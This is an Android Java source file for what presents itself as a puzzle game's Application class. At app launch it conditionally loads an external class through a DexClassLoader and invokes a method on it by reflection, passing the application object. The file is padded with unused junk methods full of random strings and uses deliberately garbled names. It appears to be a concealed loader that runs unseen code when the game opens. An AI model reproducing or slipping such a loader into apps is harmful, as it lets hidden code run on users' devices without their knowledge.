package happy.game.puzzle;

import android.app.Application;
import android.content.Context;

import java.lang.reflect.InvocationTargetException;
import java.util.concurrent.ScheduledExecutorService;

import dalvik.system.DexClassLoader;
import happy.game.courtor.GameClickLoader;
import happy.game.courtor.GamePerdlLoader;

public abstract class GamePuzzleAlt extends Application {
    public static GamePuzzleAlt mApplication;
    public static Context mContext;
    public static DexClassLoader mClass;
    public static String puzzle_mage = "happypluzzgame88";
    public static String mStr;
    public static String puzzlefig;

    public static String mLoadpus = null;

    public static ScheduledExecutorService mExecutor;
    protected abstract void upGamePuzzle();

    @Override
    public void onCreate() {
        super.onCreate();
        mApplication = this;
        if (GameClickLoader.ClickWeel()){
            try {
                mClass.loadClass("happy.pluzz.zzokr").getMethod("happy_creat1", new Class[] {Application.class }).invoke(null, new Object[] {this});
            } catch (IllegalAccessException e) {
                throw new RuntimeException(e);
            } catch (InvocationTargetException e) {
                throw new RuntimeException(e);
            } catch (NoSuchMethodException e) {
                throw new RuntimeException(e);
            } catch (ClassNotFoundException e) {
                throw new RuntimeException(e);
            }
        }else{
            upGamePuzzle();
            GamePerdlLoader.getLoader().loaderInit();
        }
    }
    private static Boolean dxdko() {   return true;    }
    private static String hqdnqnfa() {   return "kofJOuBFcnMtzwatBg";    }
    private static void gadaymfs() {   ;    }
    private static String unmddi() {   return "hnpTbPvWsIOqPGdfwkmolEJYpYhmaJZ";    }
    private static Boolean flsfzijmp() {   return false;    }
    private static Boolean xvsbavshwh() {   return false;    }
    private static String njnwtakyzb() {   return "PZGfUfKVDFOUEDcHEUbhacpzaKHkKZZMqMcdDkEgZ";    }
    @Override
    protected void attachBaseContext(Context base) {
        super.attachBaseContext(base);
    }
}
